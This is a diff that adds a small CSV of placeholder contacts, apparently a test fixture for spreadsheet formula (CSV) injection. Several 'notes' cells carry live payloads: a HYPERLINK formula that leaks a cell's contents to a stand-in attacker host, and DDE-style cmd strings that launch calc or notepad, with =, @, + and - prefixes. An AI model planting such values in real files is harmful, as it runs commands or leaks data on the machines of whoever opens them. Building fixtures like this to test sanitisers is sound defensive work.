@@ -1,0 +1,7 @@
+name,email,notes
+Alice Example,alice@example.invalid,regular customer
+Bob Sample,bob@example.invalid,"=HYPERLINK(""https://evil.example.invalid/?leak=""&A2,""click"")"
+Carol Test,carol@example.invalid,=cmd|' /C calc'!A0
+Dan Demo,dan@example.invalid,@SUM(1+1)*cmd|' /C notepad'!A0
+Eve Fake,eve@example.invalid,-2+3+cmd|' /C calc'!A0
+Frank Null,frank@example.invalid,-42
